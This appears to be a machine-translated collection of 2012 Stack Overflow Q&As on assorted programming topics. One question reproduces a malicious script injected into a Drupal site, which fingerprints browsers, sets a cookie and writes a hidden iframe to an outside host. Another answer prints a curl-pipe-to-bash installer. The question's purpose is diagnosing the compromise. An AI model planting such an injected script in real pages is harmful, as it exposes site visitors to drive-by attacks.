</ScrollViewer> 
```

# javascript - GWT：调用外部 JavaScript 库 (sjcl) 方法

> ID：10239732
> 
> 赞同：2
> 
> 时间：2012-04-20T03:11:38.487
> 
> 标签：javascript, gwt

我想在我的 GWT 项目（客户端）中使用外部加密库。（特别是斯坦福 Javascript 加密库，[http](http://crypto.stanford.edu/sjcl/) ://crypto.stanford.edu/sjcl/ 我在项目的 gwt 配置文件（MyProj.gwt.xml）中添加了这些行

```
<script src="libs/sjcl/sjcl.js" />
<script src="libs/sjcl/core/sha256.js" /> 
```

并在我的安全类中创建了一个新方法：

```
public static native String sha256(String ptext)
      /*-{
       return sjcl.hash.sha256.hash(ptext);
       }-*/; 
```

但是当我调用它时

```
String result = Security.sha256("password"); 
```

我收到一个错误（“未定义 sjcl”）

如果知道这些问题和 javasript 的人可以阅读该库并告诉我正确的方法，我将节省大量时间和精力 - 无需挖掘可怕的 JavaScript。

升级版：

我首先想到的是，外部库必须在 /war 目录中其次，如果我将以下内容添加到 gwt.xml 文件中，我无法让 GWT 导入 *.js 文件

```
<script src="libs/sjcl/sjcl.js"></script>
<script src="libs/sjcl/core/sha256.js"></script> 
```

我不得不在入口点的 html 源代码中添加类似的行

```
<script src="/sjcl/sjcl.js"></script>
<script src="/sjcl/core/sha256.js"></script> 
```

这样导入就可以了，我可以用 Chrome Inspector 检查它

我尝试使用另一个库，没有 sjcl 那么复杂，而且效果很好。所以，显然，我没有正确使用 sjcl。另一个库更简单，只是纯方法，sjcl 使用类和东西，但由于我根本不懂 JS，如果不深入研究 JS 语法，我无法弄清楚如何正确调用这些东西。我真的很想跳过这部分。

任何人都可以查看 sjcl 代码并告诉我如何正确调用该方法吗？源码真的很小，我觉得JS pro一看就知道。

UPD 2：原来在gwt.xml中加入下面的代码就够了，只要把library放到/war中，注意路径中前面的“/”。如果你不把它放在那里，GWT 将在模块目录中为你寻找 lib

UPD 3：不要忘记清除浏览器的缓存，否则“未找到”错误不会消失

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T04:09:52.453

确保当您在全局上下文中讨论对象时，您使用前缀`$wnd`，表示应用程序正在运行的主`window`实例。这在 JSNI 文档中有所记录，请参阅[https://developers.google.com/web-工具包/doc/latest/DevGuideCodingBasicsJSNI#writing](https://developers.google.com/web-toolkit/doc/latest/DevGuideCodingBasicsJSNI#writing)。

```
public static native String sha256(String ptext)
  /*-{
      return $wnd.sjcl.hash.sha256.hash(ptext);
  }-*/; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:20:17.583

“sjcl 未定义”表示您没有正确导入 sjcl 文件。检查文件路径并确保浏览器可以访问该文件。

# ios - 以标签为子视图的 CATransform3D 旋转

> ID：10239738
> 
> 赞同：1
> 
> 时间：2012-04-20T03:13:00.157
> 
> 标签：ios, catransform3d

我有一个关于 CATransform3D 的问题。

我有一个视图A，其中包含一个标签B。B的图层位置是A的中心。B用于显示通知消息。我想将A旋转180度，当然B中的文字会颠倒。所以我也必须将 B 旋转 180 度。一切看起来都很简单，实际上在模拟器中它工作正常。

但是当我在设备上加载时，A 和 B 确实旋转了，但是 B 的位置发生了变化。现在我只能看到 B 的一半，另一半不在 A 中。

我的猜测是，当旋转 A 时，因为 B 与 A 的坐标系相关，它被翻转了 180 度，所以 B 的位置发生了变化。

但我想知道是否有人知道如何解决这个问题，或者你们是否有更好的方法来解决。

非常感谢。

**更新**

我仍然无法弄清楚为什么 B 的位置会移动，但我想出了另一种方法来实现相同的动画。有点棘手。

关键是`animation.autoreverse`，我们知道当你用 Pi 旋转 label 的 super view 时，label 中的文字会被倒置旋转。所以我所做的是将超级视图旋转 Pi/2，保持相同的 duration 和 set `autoreverse = YES`，它将做的是它将超级视图旋转 Pi/2，然后将其旋转回初始状态。结果证明视图根本没有旋转，但是对于用户的视觉来说，它是旋转的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T04:07:30.037

我发现视图的 subLayers 和 subviews 并不总是对加倍动画（尤其是 alpha 和 center 变化）反应良好。如果你必须（因为它比平常贵一点），请使用 UIViewAnimationOptionAllowsAnimatedContent，这将强制重绘而不是动画的“快照”。

# java - 用于 Java 的“类 RVM”工具

> ID：10239739
> 
> 赞同：6
> 
> 时间：2012-04-20T03:13:01.247
> 
> 标签：java, maven, ant, build, continuous-integration

我正在寻找一个可以让我切换正在运行的 Java 实现的工具，比如 Ruby 的 RVM（或 RBENV）。我知道 Debian 系统提供了替代机制，并且我可以手动设置 JAVA_HOME。

但是，如果可能的话，我想要更自动化的东西。如果它可以获取 JDK，那就更好了，但不是必需的。

我已经搜索过，但没有看到类似的东西。我猜 Java 生态系统已经习惯了在 IDE 中拥有这个功能。

编辑：更改 PATH 和 JAVA_HOME 似乎工作正常。它可以是微不足道的自动化。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-03-11T14:36:29.203

有[jenv](http://jenv.io)，基于 Ruby 的 RVM。

您必须通过一些手动步骤来添加新的 Java 版本†，但是一旦它们进入，您可以使用`jenv use java $version`. 它还处理针对特定 Java 版本安装 Java 应用程序。

还有一个我没有使用过的工具，令人困惑的是，它也被命名为[jenv](http://jenv.be)，但它基于 Ruby 的 rbenv。

† 添加 Java 版本的麻烦似乎是由于 Oracle，可能是许可问题，并且似乎适用于这两种工具。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T05:42:48.723

我认为没有这样的工具。每个平台都有自己的系统。Debian/Ubuntu、RedHat/CentOS 和 SLE/OpenSUSE（可能还有其他一些发行版）使用*替代*机制。Mac OSX 有自己的内置切换机制来更改当前使用的 JVM。

我必须维护很多开发人员工作站和服务器。所有基于 *nix（OSX、Linux、Solaris）的，用于将所有 JVM 安装在一个目录中，并创建一个符号链接 CURRENT 到应该使用的版本。指向此 CURRENT 符号链接的 JAVA_HOME 和 PATH 变量。如果 Ia 想使用另一个版本，只需移动 CURRENT 符号链接。无需采取进一步措施。

不幸的是，这种方法不适用于基于 Windows 的系统。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-03-25T06:13:26.647

对于那些在 2016+ 中寻找此类工具的人 - 尝试[jabba](https://github.com/shyiko/jabba)。它是在 nvm/gvm/rvm 之后设计的（实际上 CLI 几乎与 nvm 相同）。

```
jabba install 1.8 # "jabba use 1.8" will be called automatically 
jabba ls # list all installed jdk's
jabba use 1.6 # switch to a different version of jdk 
```

全面披露：我是该项目的维护者。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-12-15T17:12:17.053

SDKman 是要走的路：

```
The Software Development Kit Manager

SDKMAN! is a tool for managing parallel versions of multiple Software Development Kits on most Unix based systems. It provides a convenient Command Line Interface (CLI) and API for installing, switching, removing and listing Candidates. Formerly known as GVM the Groovy enVironment Manager, it was inspired by the very useful RVM and rbenv tools, used at large by the Ruby community. 
```

[https://sdkman.io/](https://sdkman.io/)

特别提到 RVM，并且像 RVM 一样，通过以下方式安装`curl`：

> 现在就开始！
> 
> 继续，在终端中粘贴并运行以下命令：

```
$ curl -s "https://get.sdkman.io" | bash 
```

# c++ - 双打会溢出吗？

> ID：10239741
> 
> 赞同：3
> 
> 时间：2012-04-20T03:13:12.540
> 
> 标签：c++, c, floating-point, floating-point-precision, floating-point-exceptions

是否可以使用双精度或浮点数溢出（环绕）？如果在 x86 或 x64 硬件上达到最大值（或最小值）会发生什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-20T03:14:53.833

在符合 IEEE-754 的系统上，溢出会导致特殊的“无穷大”（或“负无穷大”）值，超出该值的任何进一步增加都将无效。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-20T03:15:01.183

没有。花车去`Inf`或`-Inf`

# android - 当用户使用我的安卓应用程序时如何隐藏我的所有日 志？

> ID：10239744
> 
> 赞同：0
> 
> 时间：2012-04-20T03:13:45.083
> 
> 标签：android, debugging, tags, logging

我的老板希望用户在使用我们的安卓应用时没有信息泄露。我发现即使我设置了`android:debuggable="false"`它仍然可以从 Logcat 或命令行查看我的日志。我搜索了 android:debuggable 有人也有同样的问题。我从互联网上得到了一些答案，例如下一个：

> Avd 有一个叫做 debugable 的属性。您可以通过 adb shell get prop 打印。我不（知道）这是否是您的问题的原因。
> 
> 如果您有预生产设备，您仍然可以调试已将 debuggable 设置为 false 的应用程序。

我只是想，即使我删除了所有日志，操作系统中也有很多关于我的应用程序的日志。

我的问题：1.有没有办法让我的“android:debuggable”正常工作，2.除了删除所有日志之外，还有其他方法可以隐藏我的所有日​​志吗？3.“android:debuggable”的真正含义是什么？4.什么是安卓设备上的“预生产设备”？

感谢您的帮助。我会尝试其他一些方式，并尽我所能在这里分享我的信息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:15:37.367

我只是围绕它创建包装函数`Log`，首先检查被`static boolean`调用的值，`loggineEnabled`如果它设置为 true，然后调用 log，否则忽略对 log 的调用。

然后，在编译我分发的应用程序版本之前，我只需将此变量设置为 false。

```
void LogD(String msg){
   if (loggingEnabled)
       Log.d(MyTag, msg)
} 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-22T09:21:23.237

您的代码是否保证没有错误？如果不是，您为什么要阻止用户获取他们可以用来揭示您的应用程序中的错误的信息？

当你能写出没有错误的代码时回来，然后我们再谈。

# android - 如何在 Android 中自定义 Toast 的显示时间？

> ID：10239747
> 
> 赞同：0
> 
> 时间：2012-04-20T03:13:56.630
> 
> 标签：android, toast

> **可能重复：**
> [设置 Toast 出现长度](https://stackoverflow.com/questions/3775074/set-toast-appear-length)

在Android中，只有两个元素来控制toast的时间：Toast.LENGTH_SHORT和Toast.LENGTH_LONG。但是我想让Toast显示只有0.5秒或更短。我该怎么办？谁能帮帮我？很感谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T03:32:18.790

[`LENGTH_SHORT`](http://developer.android.com/reference/android/widget/Toast.html#LENGTH_SHORT)和的值[`LENGTH_LONG`](http://developer.android.com/reference/android/widget/Toast.html#LENGTH_LONG)是 0 和 1。这意味着它们被视为标志而不是实际持续时间，因此我认为不可能将持续时间设置为这些值以外的任何值。

如果您想向用户显示更长时间的消息，请考虑使用[状态栏通知](http://developer.android.com/intl/fr/guide/topics/ui/notifiers/notifications.html)。当状态栏通知不再相关时，可以通过编程方式取消它们。

但这不是结束你可以这样做

```
for (int i=0; i < 2; i++)
{
    Toast.makeText(this, "blah", Toast.LENGTH_LONG).show();
} 
```

时间加倍。如果您指定 3 而不是 2 它将增加三倍的时间..等等。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-20T03:24:08.607

替换`Toast.LENGTH_LONG`或`Toast.LENGTH_SHORT`用`500`

# vb.net - 如果不是刚刚创建（或正在使用），则删除文件

> ID：10239748
> 
> 赞同：1
> 
> 时间：2012-04-20T03:14:00.577
> 
> 标签：vb.net, filesystems, delete-file

我正在创建一个控制台应用程序，它将每 30 分钟从目录中删除一次图片。问题是它每分钟左右都会被文件填充。因此，如果我去删除该目录中的文件，那么尝试删除正在创建或打开的文件可能会导致错误。

我目前有这段代码可以将文件复制到另一个目录，然后从源目录中删除它们。

```
Dim f() As String = Directory.GetFiles(sourceDir)

    For i As Integer = 0 To UBound(f)
        'Check file date here in IF statement FIRST...

        File.Copy(f(i), destDir & f(i).Replace(sourceDir, ""))

        If File.Exists(f(i)) = True Then
              File.Delete(f(i))
        End If

        Debug.Print(f(i) & " to >>> " & destDir & f(i).Replace(sourceDir, ""))
    Next 
```

我该如何使用：

```
File.GetCreationTime(f(i)) 
```

在 IF 语句中检查其当前文件是否比 30 秒前更新？

**或者**

有没有办法只填充：

```
 Dim f() As String = Directory.GetFiles(sourceDir) 
```

只有那些超过 30 秒的文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T04:23:50.370

没有可靠的方法来检测文件是否被锁定。即使您确实发现了（这在技术上是可能的），它也可能在您尝试删除它之前被锁定。删除失败还有其他原因。在你的情况下，我认为原因是什么并不重要。

唯一的方法是将 delete 调用放在 try/catch 中并捕获 IOException，然后根据需要重试。

您需要使用 FileInfo 对象来获取`CreatedTime`并与 Now 进行比较。您也可以使用`LastAccessTime`or `LastWriteTime`，但由于这些都是当时正在编写的新文件，因此您不需要。

```
Private Sub DeleteFiles()
    Dim files = From f In Directory.GetFiles("c:\temp")
                Let fi = New FileInfo(f) 
                Where fi.Exists AndAlso fi.CreationTime <= DateTime.Now.AddSeconds(-30)

    For Each f In files
        Try
            f.Delete()
        Catch ex As Exception
            If TypeOf ex Is IOException AndAlso IsFileLocked(ex) Then
                ' do something? 
            End If
            'otherwise we just ignore it.  we will pick it up on the next pass
        End Try
    Next   
End Sub

Private Shared Function IsFileLocked(exception As Exception) As Boolean
    Dim errorCode As Integer = Marshal.GetHRForException(exception) And ((1 << 16) - 1)
    Return errorCode = 32 OrElse errorCode = 33
End Function 
```

`IsFileLocked`从 SO 上的其他[线程提升的函数](https://stackoverflow.com/questions/1304/how-to-check-for-file-lock-in-c)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T04:02:20.723

```
Dim NewFileDate As DateTime = DateTime.Now.AddSeconds(-30)
' get the list of all files in FileDir
Dim PicFiles As List(Of String) = System.IO.Directory.GetFiles("C:\", "*.txt").ToList()
' filter the list to only include files older than NewFileDate
Dim OutputList As List(Of String) = PicFiles.Where(Function(x) System.IO.File.GetCreationTime(x) < NewFileDate).ToList()
' delete files in the list
For Each PicFile As String In OutputList
    'wrap this next line in a Try-Catch if you find there is file locking.
    System.IO.File.Delete(PicFile)
Next 
```

显然是针对 .Net 3.5 或 4.0

# c# - 将 INT 转换为多个 WPF 可见性的复杂绑定

> ID：10239750
> 
> 赞同：0
> 
> 时间：2012-04-20T03:14:11.603
> 
> 标签：c#, wpf, binding, visibility, ivalueconverter

好的，让我们看看我这样做是否正确，或者我是否正在努力。

第一的。我有一个整数（0-255）的帐户级别，每个字节都设置为启用给定的功能。我正在设置对给定字节伪 XML 代码的可见性

```
<Button Grid.Column="0" Grid.Row="0" Name="Function" Content="Function 1" Visibility="{Binding UserLevel.Allow1 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="1" Name="Function" Content="Function 2" Visibility="{Binding UserLevel.Allow2 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="2" Name="Function" Content="Function 3" Visibility="{Binding UserLevel.Allow3 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="3" Name="Function" Content="Function 4" Visibility="{Binding UserLevel.Allow4 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="4" Name="Function" Content="Function 5" Visibility="{Binding UserLevel.Allow5 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="5" Name="Function" Content="Function 6" Visibility="{Binding UserLevel.Allow6 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="6" Name="Function" Content="Function 7" Visibility="{Binding UserLevel.Allow7 , UpdateSourceTrigger=PropertyChanged}"/>
<Button Grid.Column="0" Grid.Row="7" Name="Function" Content="Function 8" Visibility="{Binding UserLevel.Allow8 , UpdateSourceTrigger=PropertyChanged}"/> 
```

当用户登录时，类 ProgramVar.ActiveUser 被拉出并从 PHP Soap 接口设置为当前登录的用户（工作）

```
class ProgramVar : INotifyPropertyChanged
{
    private User _ActiveUser;
    private Level _UserLevel;
    public User ActiveUser { get { return this._ActiveUser; } set { _ActiveUser= value; UpdateLevel(); NotifyPropertyChanged("ActiveUser "); } }
    public Level UserLevel { get { return this._UserLevel; } set { _UserLevel= value; NotifyPropertyChanged("UserLevel"); } }
    private void UpdateLevel()
    {
        UserLevel.Allow1 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 1) UserLevel.Allow1 = Visibility.Visible;
        UserLevel.Allow2 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 2) UserLevel.Allow2 = Visibility.Visible;
        UserLevel.Allow3 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 4) UserLevel.Allow3 = Visibility.Visible;
        UserLevel.Allow4 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 8) UserLevel.Allow4 = Visibility.Visible;
        UserLevel.Allow5 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 16) UserLevel.Allow5 = Visibility.Visible;
        UserLevel.Allow6 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 32) UserLevel.Allow6 = Visibility.Visible;
        UserLevel.Allow7 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 64) UserLevel.Allow7 = Visibility.Visible;
        UserLevel.Allow8 = Visibility.Collapsed; if(ActiveUser.AccountLevel & 128) UserLevel.Allow8 = Visibility.Visible;
        NotifyPropertyChanged("UserLevel");
    }
}
class User
{
  string UserName;
  string FirstName;
  int AccountLevel;
}
class Level
{
  Visibility Allow1 = Visibility.Visible;
  Visibility Allow2 = Visibility.Visible;
  Visibility Allow3 = Visibility.Visible;
  Visibility Allow4 = Visibility.Visible;
  Visibility Allow5 = Visibility.Visible;
  Visibility Allow6 = Visibility.Visible;
  Visibility Allow7 = Visibility.Visible;
  Visibility Allow8 = Visibility.Visible;
} 
```

现在我也在阅读 IValueConverters，使用当前方法是正确的方法，还是应该在 XAML 和 CS 文件中使用 IValueConverts？

我正在使用的 Current 方法正在工作，因为当我尝试使用 IValueConvertes 时，我没有看到如何让对象返回多个 Visibilities（或其他变量，如果需要）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T05:19:13.370

你做错了很多事情......

1.  您`Level.AllowX`是字段而不是属性。WPF 期望属性参与绑定。
2.  将它们转换为属性后，`AllowX`setter 应该引发 PropertyChangedNotifications（就像 in 一样`ProgramVar.UserLevel`）。
3.  你`NotifyPropertyChanged("ActiveUser ")`有一个尾随空格！它应该是`NotifyPropertyChanged("ActiveUser")`。
4.  由于您已经在设置`Visibility`枚举值，所以我认为您的绑定中不需要值转换器。
5.  虽然最终创建 255 个`AllowLevel`字段是个坏主意！请检查如何`ItemsControls`使用`ItemsSource`值`List<Visibility>`！

# php - 如何将一个非常长的内存密集型循环分成更小的块

> ID：10239752
> 
> 赞同：0
> 
> 时间：2012-04-20T03:14:38.723
> 
> 标签：php, loops, http-headers

我有一个相当长的内存密集型循环。我无法一次性运行它，因为我的服务器设置了执行时间限制，或者我的内存不足。

我想把这个循环分成更小的块。

我有一个想法，将循环分成更小的块，然后设置一个位置标头以使用新的起始条件重新加载脚本。

我的旧脚本（伪代码。我知道以下缺点）

```
for($i=0;$i<1000;$i++)
{
  //FUNCTION
} 
```

我的新脚本

```
$start=$_GET['start'];
$end=$start+10;

for($i=$start;$i<$end;$i++;)
{
   //FUNCTION
}

header("Location:script.php?start=$end"); 
```

但是，我的新脚本成功运行了几次迭代，然后出现服务器错误“重定向太多”

有没有解决的办法？有人可以提出更好的策略吗？

我在共享服务器上，因此无法增加内存分配或脚本执行时间。

我想要一个 PHP 解决方案。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:35:45.853

“重定向过多”是浏览器错误，因此 PHP 解决方案是使用 cURL 或标准流来加载初始页面并让它跟随所有重定向。您必须在没有超时限制的机器上运行它（例如使用 CLI）

要考虑的另一件事是使用 AJAX。您页面上的一段 JavaScript 将运行您的脚本，收集脚本的输出并确定是停止（计算结束）还是继续（从 X 开始）。这样你也可以创建一个漂亮的进度表;-)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:29:22.877

您可能想研究[分叉子进程](http://php.net/manual/en/function.pcntl-fork.php)来完成这项工作。这些子进程可以在自己的内存空间中以较小的块完成工作，而父进程会触发多个子进程。这通常由 Gearman 处理，但也可以不用。

在 Dealnews 的开发者网站上查看[Forking PHP 。](http://dealnews.com/developers)它有一个库和一些示例代码来帮助管理需要生成子进程的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:18:14.210

首先，在不知道您在循环中做什么的情况下，很难告诉您实际解决问题的最佳方法。但是，如果你想执行一些需要很长时间的事情，我的建议是设置一个 cron 作业，让它一次确定一小部分。该脚本将记录它停止的位置，并且在下次启动时，它可以读取日志以了解从哪里开始。

* * *

编辑：如果你对 cron 死心塌地，并且你不太关心用户体验，你可以这样做：

让页面加载类似于上面的 cron 作业。除非经过这么多秒或迭代，否则停止脚本。显示刷新元标记或 javascript 刷新。这样做直到任务完成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T03:20:43.100

通常，如果我必须多次迭代某些东西并且它有大量数据，我会使用“延迟加载”类型的应用程序，例如：

```
for($i=$start;$i<$end;$i++;)
{
   $data_holder[] = "adding my big data chunks!";
   if($i % 5 == 1){   
    //function to process data
    process_data($data_holder); // process that data like a boss!
    unset($data_holder); // This frees up the memory
   }
}

 // Now pick up the stragglers of whatever is left in the data chunk
 if(count($data_holder) > 0){
    process_data($data_holder);
 } 
```

这样你就可以继续遍历你的数据，但你不会填满你的内存。您可以分块工作，然后取消设置数据，分块工作，取消设置数据等。以帮助防止内存。至于执行时间，这取决于你必须做多少/编写脚本的效率。

基本前提——“以较小的块处理数据以避免内存问题。保持设计简单以保持快速。”

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T03:24:37.647

您如何在循环中放置一个条件，使其每 100 次迭代休眠一次？

```
for ($i = 0; $i < 1000; $i++)
{
    if ($i % 100 == 0)
        sleep(1800) //Sleep for half an hour
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-20T04:01:16.997

由于您的限制，我认为您使用的方法可以工作。可能是您的浏览器试图变得聪明，而不是让您重定向回您刚刚访问的页面。它可能试图防止无限循环。

你可以试试

*   在两个相同（或别名）的脚本之间来回重定向。

*   不同的浏览器。

*   让您的脚本输出带有刷新标签的 HTML 页面，例如

    `<meta http-equiv="refresh" content="1; url=http://example.com/script.php?start=xxx">`

# javascript - 为什么 Drupal 网站上出现“103fm”脚本？

> ID：10239755
> 
> 赞同：6
> 
> 时间：2012-04-20T03:15:07.257
> 
> 标签：javascript, html, drupal

> **可能重复：**
> [奇怪的脚本出现在我网站的 DOM 中](https://stackoverflow.com/questions/10239577/weird-script-appearing-in-my-websites-dom)

我刚刚注意到我的网站 DOM 中运行了一个奇怪的脚本。我正在运行 DRUPAL。该脚本是[http://www.103fm.net/release.js](http://www.103fm.net/release.js)。我不知道从哪里开始寻找这个流氓脚本。我的网站是 miloads.com，它只出现在管理菜单中。奇怪的是该文件在 103fm.net 上不存在，但它实际上加载了以下脚本：

```
var BrowserDetect = {
init: function() {
this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version";
this.OS = this.searchString(this.dataOS) || "an unknown OS";
},
searchString: function(data) {
for (var i = 0; i < data.length; i++) {
var dataString = data[i].string;
var dataProp = data[i].prop;
this.versionSearchString = data[i].versionSearch || data[i].identity;
if (dataString) {
if (dataString.indexOf(data[i].subString) != -1)
return data[i].identity;
} else if (dataProp)
return data[i].identity;
}
},
searchVersion: function(dataString) {
var index = dataString.indexOf(this.versionSearchString);
if (index == -1)
return;
return parseFloat(dataString.substring(index + this.versionSearchString.length + 1));
},
dataBrowser: [{
string: navigator.userAgent,
subString: "Firefox",
identity: "Firefox"
}, {
string: navigator.userAgent,
subString: "MSIE",
identity: "Explorer",
versionSearch: "MSIE"
}],
dataOS: [{
string: navigator.platform,
subString: "Win",
identity: "Windows"
}]
};
function addCookie(szName, szValue, dtDaysExpires) {
var dtExpires = new Date();
var dtExpiryDate = "";
dtExpires.setTime(dtExpires.getTime() + dtDaysExpires * 24 * 60 * 60 * 1000);
dtExpiryDate = dtExpires.toGMTString();
document.cookie = szName + "=" + szValue + ";expires=" + dtExpiryDate;
}
function findCookie(szName) {
var i = 0;
var nStartPosition = 0;
var nEndPosition = 0;
var szCookieString = document.cookie;
while (i <= szCookieString.length) {
nStartPosition = i;
nEndPosition = nStartPosition + szName.length;
if (szCookieString.substring(nStartPosition, nEndPosition) == szName) {
nStartPosition = nEndPosition + 1;
nEndPosition = document.cookie.indexOf(";", nStartPosition);
if (nEndPosition < nStartPosition)
nEndPosition = document.cookie.length;
return document.cookie.substring(nStartPosition, nEndPosition);
break;
}
i++;
}
return "";
}
BrowserDetect.init();
var szCookieString = document.cookie;
var stopit = BrowserDetect.browser;
var os = BrowserDetect.OS;
if (((stopit == "Firefox" || stopit == "Explorer") && (os == "Windows")) && (findCookie('geo_id2') != '753445')) {
addCookie("geo_id2", "753445", 1);
document.write("<if" + "rame name='info' src='http://www.ztanalytics.com/stat.cgi?s_id=1' width=1 height=1 scrolling=no frameborder=0></if" + "rame>");
} else {} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T11:31:08.880

同样，我们客户的服务器昨晚被罗马尼亚、捷克共和国和波兰的 IP 地址入侵。这些看似自动化的过程似乎在主体标签的顶部注入了一个脚本标签。该脚本似乎会在运行 Firefox 和 IE 的 Windows 机器上生成一个 cookie。然后它会打开一个 iframe 并运行在俄罗斯托管的站点上运行的 CGI 脚本。

幸运的是，最新版本的 Firefox 甚至不会加载脚本；然而，IE 确实如此。

Chrome（尽管没有受到影响）甚至不允许您访问发生这种情况的页面。

由于我能找到的所有报告都是最近发生的，这很可能是软件漏洞，而不是密码泄露 - 您正在运行什么 FTP 服务器（使用您的 FTP 客户端连接到服务器，控制台应该会告诉您）。有问题的服务器正在运行 ProFTPd 1.3.1。

如果该软件是通用的，则应通知创建者。

# javascript - 在连接到网络音频 api 的音频元素上设置播放速率

> ID：10239757
> 
> 赞同：6
> 
> 时间：2012-04-20T03:15:11.703
> 
> 标签：javascript, html, html5-audio, web-audio-api

我一直在尝试使用 createMediaElementSource 将音频元素连接到网络音频 api 并让它工作，但我需要做的一件事是改变音频标签的播放速率，但我无法让它工作。

如果您尝试运行下面的代码，您将看到它可以正常工作，直到您取消注释我们设置播放速率的行。当这条线在音频被静音。

我知道我可以使用 source.playbackRate.value 在 AudioBufferSourceNode 上设置播放速率，但这不是我想做的，我需要在使用 createMediaElementSource 连接到网络音频 api 时设置音频元素的播放速率所以我没有任何 AudioBufferSourceNode。

有没有人设法做到这一点？

```
var _source,
     _audio,
     _context,
     _gainNode;

_context = new webkitAudioContext();

function play(url) {
    if (_audio) {
        _audio.pause();
    }
    _audio = new Audio(url);
    //_audio.playbackRate = 0.6;

    setTimeout(function() {
        if (!_gainNode) {
            _gainNode = _context.createGainNode();
            _gainNode.gain.value = 0.1;
            _gainNode.connect(_context.destination);
        }

        _source = _context.createMediaElementSource(_audio);
        _source.connect(_gainNode);

        _audio.play();
    }, 0);

}

play("http://geo-samples.beatport.com/items/volumes/volume2/items/3000000/200000/40000/9000/400/60/3249465.LOFI.mp3");

setTimeout(function () {
    _audio.pause();
}, 4000); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-07T12:41:41.943

您必须在音频开始播放*后设置播放速率。*我发现使这项工作的唯一可移植方法是等到您收到`timeupdate`有效的事件`currentTime`：

```
_audio.addEventListener('timeupdate', function(){
    _if(!isNaN(audio.currentTime)) {
        _audio.playbackRate = 0.6;
    }
}); 
```

请注意，Android 目前不支持播放速率，Chrome（桌面版）不支持低于 0.5 的播放速率。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:37:31.493

你用哪个浏览器来测试这个？似乎这还没有在 Firefox 中实现，但应该在 Chrome 上运行。

Mozilla实现playbackRate的bug： [https ://bugzilla.mozilla.org/show_bug.cgi?id=495040](https://bugzilla.mozilla.org/show_bug.cgi?id=495040)

# playn - PlayN：GroupLayer.add(layer) 似乎忽略了图层的深度属性

> ID：10239758
> 
> 赞同：1
> 
> 时间：2012-04-20T03:15:13.757
> 
> 标签：playn

假设我有 4 层，A、B、C、D，layer.depth() 为 1、4、2、3。

当我通过使用 groupLayer.add(layer) 将这些层添加到父层时，它们添加的索引 (ala, depth,) 似乎忽略了 'depth()' 属性，结果仅根据我时的顺序添加它们。

不确定这是一个实现错误还是我的用法语义错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T15:34:51.623

我不确定这是你的问题，但现在肯定是我的。

我很确定层深度只服从组**内**的深度值。如果您嵌套组（例如角色的一部分），我认为较高级别组中的图层将始终绘制在较低级别组中的图层上方。当我尝试创建一个类似木偶的角色时，我现在遇到了这个问题，其中有很多图像层排列在身体部位的组层层次结构中。躯干需要位于转换层次结构的顶部，但也需要在躯干顶部绘制一些层。目前，我认为您不能使用将图像层作为子层的单个组层层次结构来执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T12:24:18.860

`GroupLayer.add(layer, depth)` [已被弃用](http://docs.playn.googlecode.com/git/javadoc/index.html)。相反，您应该使用`Layer.setDepth`.

# javascript - 使用 Javascript 向 URL 添加参数

> ID：10239759
> 
> 赞同：1
> 
> 时间：2012-04-20T03:15:20.730
> 
> 标签：javascript, facebook, parameters, url-parameters

我有一个带有 jQ​​uery 灯箱的网页，它会在页面加载时自动打开。在灯箱中，我实现了 Facebook Like 按钮（这是电子邮件中 ​​Facebook Like 按钮的 2 单击解决方案）。现在，当 Facebook 用户通过单击 Facebook 上的“喜欢”URL 访问我的网页时，我想关闭灯箱。我不想创建两个不同的页面（一个打开灯箱，另一个关闭），我想我可以通过使用 Javascript 向 URL 添加一个参数然后根据该参数打开/关闭灯箱来避免这种情况. 这是一种安全的方法吗？我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T04:37:02.700

